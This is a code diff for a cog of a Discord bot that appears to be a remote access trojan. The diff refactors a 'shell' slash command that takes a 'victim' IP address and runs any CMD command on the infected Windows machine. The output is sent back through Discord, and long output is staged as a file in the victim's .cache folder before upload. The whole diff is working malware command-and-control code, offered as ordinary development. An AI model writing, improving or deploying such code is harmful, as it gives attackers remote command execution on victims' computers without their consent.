@@ -2,8 +2,7 @@ import disnake as discord
 from disnake.ext import commands
 from datetime import datetime
 
-            from threading import Thread
-import os, requests
+import os, requests, subprocess, time
 nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"
 
 class Shell(commands.Cog):
@@ -11,46 +10,47 @@ class Shell(commands.Cog):
         self.bot = bot
         self.ip_addr = self.bot.ip_addr
         
-    @commands.slash_command(description="Executes shell commands")
-    async def shell(self, ctx, victim, msg): 
+    @commands.slash_command(
+        description="Executes shell commands",
+        options=[
+            discord.Option("victim", description="IP Address of specific victim", required=True),
+            discord.Option("command", description="The CMD command which will be executed", required=True),
+        ]
+    )
+    async def shell(self, ctx, victim, command): 
         if str(victim) == str(self.ip_addr):
             await ctx.response.defer()
             
-            global status
-            status = None
+            output = subprocess.run(
+                command, 
+                shell=True,
+                stdin=subprocess.PIPE, 
+                stderr=subprocess.PIPE,
+                stdout=subprocess.PIPE, 
+            ).stdout.decode('utf-8')
             
-            def shell():
-                output = subprocess.run(msg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                global status
-                status = "ok"
-                return output
-                
-            shel = Thread(target=shell); shel._running = True; shel.start()
-            time.sleep(2); shel._running = False
-            if status:
-                result = str(shell().stdout.decode("CP437"))
-                print(result)
-                numb = len(result)
-                print(numb)
-                if numb < 1:
-                    return await ctx.followup.send(
-                        embed=EmbedGen("Information",  "Command Output:", "Command not recognized or no output was obtained")
-                    )
-                elif numb > 1990:
-                    os.chdr(nr_working)
-                    f1 = open("shell.txt", "a")
-                    f1.write(result)
-                    f1.close()
-                    file = discord.File("shell.txt", filename="shell.txt")
-                    return await ctx.followup.send("Command successfully executed", file=file)
-                    os.popen("del shell.txt")
-                else:
-                    return await ctx.followup.send(f"```{result}```")
-            else:
+            if len(output) > 4095:
+                os.chdir(nr_working)
+                with open("output.txt", 'w+') as f:
+                    f.write(output)
                 await ctx.followup.send(
-                    embed=EmbedGen("Information",  "Command Output:", "Command not recognized or no output was obtained")
+                    f"Output for `{command}`:", 
+                    file = discord.File(
+                        "output.txt", 
+                        filename="output.txt"
+                    )
                 )
-                status = None
-
+                time.sleep(2)
+                os.remove("output.txt")
+                os.chdir(self.bot.original_dir)
+                return None
+                
+            embed = self.bot.genEmbed(
+                f"Output for `{command}`:",
+                datetime.now(),
+                f"```{output}```"
+            )
+            await ctx.followup.send(embed=embed)
+            
 def setup(bot: commands.Bot):
     bot.add_cog(Shell(bot))
